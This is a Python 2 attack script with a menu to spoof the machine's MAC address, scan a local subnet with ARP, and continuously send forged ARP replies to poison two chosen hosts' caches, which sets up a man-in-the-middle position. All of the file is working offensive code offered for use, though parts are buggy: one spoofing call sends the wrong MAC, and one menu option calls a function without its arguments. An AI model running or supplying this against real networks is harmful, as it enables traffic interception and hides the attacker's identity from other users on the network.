import subprocess
import re
import scapy.all as scapy
import time
import sys
def new():
    a = raw_input("enter the new mac address: ")
    subprocess.call("ifconfig eth0 down",shell=True)
    subprocess.call("ifconfig eth0 hw ether "+a,shell=True)
    subprocess.call("ifconfig eth0 up",shell=True)
    result = subprocess.check_output("ifconfig",shell=True)
    output = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",result)
    print ("mac address changed to " + output.group(0))

def restore():
    b = raw_input("do you want to restore your real mac address(y/n)")
    if(b == "y"):
        subprocess.call("ifconfig eth0 down",shell=True)
        subprocess.call("ifconfig eth0 hw ether 08:00:27:24:e5:c6",shell=True)
        subprocess.call("ifconfig eth0 up",shell=True)
        subprocess.call("ifconfig",shell=True)
    else:
        print("program terminated")
def arp_scan(ip):
    #scapy.arping(ip) #discovers all the hosts in the network
    arp_req = scapy.ARP(pdst=ip)               #creating an arp request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                  #creating an ethernet frame
    arp_broadcast = broadcast/arp_req#creating a packet by integrating arp and ether by forward slash.scapy allow this
    answered= scapy.srp(arp_broadcast,timeout=1,verbose = False)[0]#it is a list itself
    print("id\t\tip address \t\t\t mac address")
    output_list = []
    for i in answered:
        output_dict = {"ip":i[1].psrc,"mac":i[1].hwsrc}
        output_list.append(output_dict)

    k = 1
    for j in output_list:
        print(str(k)+"\t\t"+j["ip"] + "\t\t" + j["mac"])
        k = k + 1

    return output_list

def arp_spoof(id_t,id_s,mac_t):

        arp_req = scapy.ARP(op=2,pdst=id_t,hwdst=mac_t,psrc=id_s)#op is 2 for arp reply
        scapy.send(arp_req,verbose = False)#to send packet

def ip_select(output_list):
    id_t = int(raw_input("set the(id) target  ip: "))
    id_s = int(raw_input("set the(id) source/spoof  ip: "))
    psrc = output_list[id_s-1]["ip"]
    pdst = output_list[id_t-1]["ip"]
    hwdst = output_list[id_t-1]["mac"]
    print("####### arp spoofing ########\n")
    i = 2
    try:
        while True:
            arp_spoof(pdst,psrc,hwdst)
            arp_spoof(psrc,pdst,hwdst)
            print("\rpackets send : "+str(i)),
            sys.stdout.flush()
            i = i + 2
            time.sleep(2)
    except KeyboardInterrupt:
        print ("\nprogram terminated by the user")


while True:

     c = input("1.set new mac address\n2.restore mac address\n3.network scan and arp spoofing\n0.exit\n")
     if (type(c) == str):
     	print("invalid input")
     	continue
     elif(c == 1):
         new()
     elif(c == 2):
         restore()
     elif(c == 3):
         return1 = arp_scan("192.168.1.1/24")
         r = int(raw_input("do you want to spoof any ip?(1/0): "))
         if(r == 1):
             ip_select(return1)
         else:
             break
     elif(c == 4):
         arp_spoof()
     else:
         print ("program interrupted by the user")
         exit(0)
